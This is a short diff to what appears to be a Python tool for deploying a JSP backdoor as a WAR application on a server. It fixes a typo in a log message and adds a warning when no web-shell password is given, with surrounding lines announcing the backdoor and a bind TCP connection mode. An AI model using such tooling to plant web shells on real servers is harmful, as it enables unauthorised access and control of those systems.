@@ -570,7 +570,7 @@ def main():
                 logging.info("Removing previously deployed WAR application with name: '%s'" % opts.remove_appname)
                 if not opts.simulate:
                     if removeApplication(browser, url, opts.remove_appname):
-                        logger.info("\033[0;32miSucceeded. Hasta la vista!\033[1;0m")
+                        logger.info("\033[0;32mSucceeded. Hasta la vista!\033[1;0m")
                     else:
                         logging.error("Removal failed miserably!")
                 else:
@@ -616,7 +616,10 @@ def main():
 
             if invokeApplication(browser, args[0], opts):
                 logger.info("\033[0;32mJSP Backdoor up & running on http://%s/%s/\033[1;0m" % (args[0], opts.appname))
-                logger.info("\033[0;33mHappy pwning, here take that password for web shell: '%s'\033[1;0m" % opts.shellpass)
+                if opts.shellpass.lower() != 'none':
+                    logger.info("\033[0;33mHappy pwning, here take that password for web shell: '%s'\033[1;0m" % opts.shellpass)
+                else:
+                    logger.warning("\033[0;33mHappy pwning, you've not specified shell password (caution with that!)\033[1;0m")
 
                 if mode == 2 and not opts.noconnect:
                     # If Bind TCP - firstly invoke application, then connect back to it.
